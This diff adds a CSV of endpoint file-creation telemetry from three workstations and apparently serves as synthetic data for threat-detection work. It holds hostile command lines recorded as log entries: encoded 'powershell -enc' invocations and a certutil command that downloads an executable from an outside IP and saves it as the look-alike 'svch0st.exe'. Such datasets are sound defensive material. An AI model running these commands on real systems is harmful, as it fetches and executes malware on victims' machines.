@@ -1,0 +1,33 @@
+EventTimestampUTC,DeviceName,DeviceId,FileName,FolderPath,ActionType,ProcessName,ProcessFilePath,pid,ProcessCommandLine
+2024-03-12T08:00:32Z,WS-FINANCE-01,dev-fin-01,report.docx,C:\Users\Documents\,FileCreated,winword.exe,C:\Program Files\Microsoft Office\winword.exe,1024,winword.exe
+2024-03-12T08:00:48Z,WS-FINANCE-01,dev-fin-01,report.docx,C:\Users\Documents\,FileCreated,winword.exe,C:\Program Files\Microsoft Office\winword.exe,1027,winword.exe
+2024-03-12T08:01:09Z,WS-FINANCE-01,dev-fin-01,report.docx,C:\Users\Documents\,FileCreated,winword.exe,C:\Program Files\Microsoft Office\winword.exe,1029,winword.exe
+2024-03-12T08:01:15Z,WS-FINANCE-01,dev-fin-01,report.docx,C:\Users\Documents\,FileCreated,winword.exe,C:\Program Files\Microsoft Office\winword.exe,1034,winword.exe
+2024-03-12T08:01:33Z,WS-FINANCE-01,dev-fin-01,budget.xlsx,C:\Users\Documents\,FileCreated,excel.exe,C:\Program Files\Microsoft Office\excel.exe,1037,excel.exe
+2024-03-12T08:01:40Z,WS-FINANCE-01,dev-fin-01,budget.xlsx,C:\Users\Documents\,FileCreated,excel.exe,C:\Program Files\Microsoft Office\excel.exe,1045,excel.exe
+2024-03-12T08:01:47Z,WS-FINANCE-01,dev-fin-01,budget.xlsx,C:\Users\Documents\,FileCreated,excel.exe,C:\Program Files\Microsoft Office\excel.exe,1050,excel.exe
+2024-03-12T08:01:53Z,WS-FINANCE-01,dev-fin-01,budget.xlsx,C:\Users\Documents\,FileCreated,excel.exe,C:\Program Files\Microsoft Office\excel.exe,1058,excel.exe
+2024-03-12T08:05:04Z,WS-FINANCE-01,dev-fin-01,update.log,C:\Windows\Logs\,FileCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,1133,powershell -enc SQBFAFgA
+2024-03-12T08:05:23Z,WS-FINANCE-01,dev-fin-01,update.log,C:\Windows\Logs\,FileCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,1149,powershell -enc SQBFAFgA
+2024-03-12T08:05:42Z,WS-FINANCE-01,dev-fin-01,update.log,C:\Windows\Logs\,FileCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,1158,powershell -enc SQBFAFgA
+2024-03-12T08:06:01Z,WS-FINANCE-01,dev-fin-01,update.log,C:\Windows\Logs\,FileCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,1169,powershell -enc SQBFAFgA
+2024-03-12T08:00:21Z,WS-IT-02,dev-it-02,report.docx,C:\Users\Documents\,FileCreated,winword.exe,C:\Program Files\Microsoft Office\winword.exe,1201,winword.exe
+2024-03-12T08:00:50Z,WS-IT-02,dev-it-02,report.docx,C:\Users\Documents\,FileCreated,winword.exe,C:\Program Files\Microsoft Office\winword.exe,1204,winword.exe
+2024-03-12T08:01:05Z,WS-IT-02,dev-it-02,report.docx,C:\Users\Documents\,FileCreated,winword.exe,C:\Program Files\Microsoft Office\winword.exe,1211,winword.exe
+2024-03-12T08:01:29Z,WS-IT-02,dev-it-02,report.docx,C:\Users\Documents\,FileCreated,winword.exe,C:\Program Files\Microsoft Office\winword.exe,1218,winword.exe
+2024-03-12T08:01:52Z,WS-IT-02,dev-it-02,budget.xlsx,C:\Users\Documents\,FileCreated,excel.exe,C:\Program Files\Microsoft Office\excel.exe,1227,excel.exe
+2024-03-12T08:01:59Z,WS-IT-02,dev-it-02,budget.xlsx,C:\Users\Documents\,FileCreated,excel.exe,C:\Program Files\Microsoft Office\excel.exe,1236,excel.exe
+2024-03-12T08:02:12Z,WS-IT-02,dev-it-02,budget.xlsx,C:\Users\Documents\,FileCreated,excel.exe,C:\Program Files\Microsoft Office\excel.exe,1239,excel.exe
+2024-03-12T08:02:39Z,WS-IT-02,dev-it-02,budget.xlsx,C:\Users\Documents\,FileCreated,excel.exe,C:\Program Files\Microsoft Office\excel.exe,1248,excel.exe
+2024-03-12T08:05:55Z,WS-IT-02,dev-it-02,update.log,C:\Windows\Logs\,FileCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,1332,powershell -enc SQBFAFgA
+2024-03-12T08:06:14Z,WS-IT-02,dev-it-02,update.log,C:\Windows\Logs\,FileCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,1342,powershell -enc SQBFAFgA
+2024-03-12T08:06:33Z,WS-IT-02,dev-it-02,update.log,C:\Windows\Logs\,FileCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,1353,powershell -enc SQBFAFgA
+2024-03-12T08:06:52Z,WS-IT-02,dev-it-02,update.log,C:\Windows\Logs\,FileCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,1363,powershell -enc SQBFAFgA
+2024-03-12T08:01:04Z,WS-HR-07,dev-hr-07,report.docx,C:\Users\Documents\,FileCreated,winword.exe,C:\Program Files\Microsoft Office\winword.exe,1390,winword.exe
+2024-03-12T08:01:13Z,WS-HR-07,dev-hr-07,report.docx,C:\Users\Documents\,FileCreated,winword.exe,C:\Program Files\Microsoft Office\winword.exe,1397,winword.exe
+2024-03-12T08:01:32Z,WS-HR-07,dev-hr-07,budget.xlsx,C:\Users\Documents\,FileCreated,excel.exe,C:\Program Files\Microsoft Office\excel.exe,1399,excel.exe
+2024-03-12T08:01:49Z,WS-HR-07,dev-hr-07,budget.xlsx,C:\Users\Documents\,FileCreated,excel.exe,C:\Program Files\Microsoft Office\excel.exe,1407,excel.exe
+2024-03-12T08:03:29Z,WS-HR-07,dev-hr-07,update.log,C:\Windows\Logs\,FileCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,1446,powershell -enc SQBFAFgA
+2024-03-12T08:03:48Z,WS-HR-07,dev-hr-07,update.log,C:\Windows\Logs\,FileCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,1451,powershell -enc SQBFAFgA
+2024-03-12T08:04:03Z,WS-HR-07,dev-hr-07,invoice_March.docm,C:\Users\asmith\Downloads\,FileCreated,winword.exe,C:\Program Files\Microsoft Office\winword.exe,1456,winword.exe
+2024-03-12T08:04:15Z,WS-HR-07,dev-hr-07,svch0st.exe,C:\Users\Public\,FileCreated,certutil.exe,C:\Windows\System32\certutil.exe,1468,certutil -urlcache -f http://185.220.101.47/p.exe svch0st.exe
